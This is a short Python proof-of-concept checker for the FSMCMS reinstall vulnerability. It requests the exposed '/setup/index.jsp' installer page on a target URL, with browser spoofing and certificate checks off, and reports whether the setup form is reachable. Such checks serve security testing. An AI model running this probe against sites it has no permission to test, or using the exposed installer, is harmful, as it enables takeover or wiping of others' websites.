#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: FSMCMS网站重装漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-043380
author: Lucifer
description: 东方文辉网站群内容管理系统FSMCMS网站重装漏洞,网站安装程序在安装之后默认没有删除，也没有限制，可以很容易的恶意把网站重装了。
'''
import sys
import warnings
import requests
def run(url):
        result = ['FSMCMS网站重装漏洞','','']
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/setup/index.jsp"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r'</font><input type="text" name="SetUpPath"' in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

